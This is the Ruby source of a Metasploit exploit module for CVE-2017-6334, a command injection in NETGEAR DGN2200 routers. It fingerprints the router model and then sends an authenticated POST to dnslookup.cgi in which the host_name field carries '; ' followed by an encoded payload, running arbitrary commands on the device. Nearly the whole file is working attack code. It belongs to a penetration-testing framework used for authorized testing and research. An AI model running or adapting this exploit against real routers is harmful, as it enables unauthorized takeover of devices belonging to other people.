##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'net/http'
require "base64"

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'                 => "Netgear DGN2200 dnslookup.cgi Command Injection",
      'Description'          => %q{
        This module exploits a command injection vulnerablity in NETGEAR
        DGN2200v1/v2/v3/v4 routers by sending a specially crafted post request
        with valid login details.
      },
      'License'              => MSF_LICENSE,
      'Platform'             => 'unix',
      'Author'               => [
        'thecarterb',  # Metasploit Module
        'SivertPL'     # Vuln discovery
      ],
      'DefaultTarget'        => 0,
      'Privileged'           => true,
      'Arch'                 => [ARCH_CMD],
      'Targets'              => [
        [ 'NETGEAR DDGN2200 Router', { } ]
      ],
      'References'           =>
        [
          [ 'EDB', '41459'],
          [ 'CVE', '2017-6334']
        ],
      'DisclosureDate' => 'Feb 25 2017',
    ))

    register_options(
      [
        Opt::RPORT(80),
        OptString.new('USERNAME', [true, 'Username to authenticate with', '']),
        OptString.new('PASSWORD', [true, 'Password to authenticate with', ''])
      ], self.class)

    register_advanced_options(
    [
      OptString.new('HOSTNAME', [true, '"Hostname" to look up (doesn\'t really do anything important)', 'www.google.com'])
    ], self.class)
    end

  # Requests the login page which tells us the hardware version
  def check
    res = send_request_cgi({'uri'=>'/'})
    if res.nil?
      fail_with(Failure::Unreachable, 'Connection timed out.')
    end
     # Checks for the `WWW-Authenticate` header in the response
    if res.headers["WWW-Authenticate"]
      data = res.to_s
      marker_one = "Basic realm=\"NETGEAR "
      marker_two = "\""
      model = data[/#{marker_one}(.*?)#{marker_two}/m, 1]
      vprint_status("Router is a NETGEAR router (#{model})")
      if model == 'DGN2200v1' || model == 'DGN2200v2' || model == 'DGN2200v3' || model == 'DGN2200v4'
        print_good("Router may be vulnerable (NETGEAR #{model})")
        return CheckCode::Detected
      else
        return CheckCode::Safe
      end
    else
      print_error('Router is not a NETGEAR router')
      return CheckCode::Safe
    end
  end

  def exploit
    check

    # Convert datastores
    user = datastore['USERNAME']
    pass = datastore['PASSWORD']
    hostname = datastore['HOSTNAME']

    vprint_status("Using encoder: #{payload.encoder} ")
    print_status('Sending payload...')

    vprint_status("Attempting to authenticate with: #{user}:#{pass} (b64 encoded for auth)")

    creds_combined = Base64.strict_encode64("#{user}:#{pass}")
    vprint_status("Encoded authentication: #{creds_combined}")

    res = send_request_cgi({
      'uri'         => '/dnslookup.cgi',
      'headers'     => {
        'Authorization' => "Basic #{creds_combined}"
      },
      'vars_post'   => {
        'lookup'    => 'Lookup',
        'host_name' => hostname + '; ' + payload.encoded
    }})

  end
end
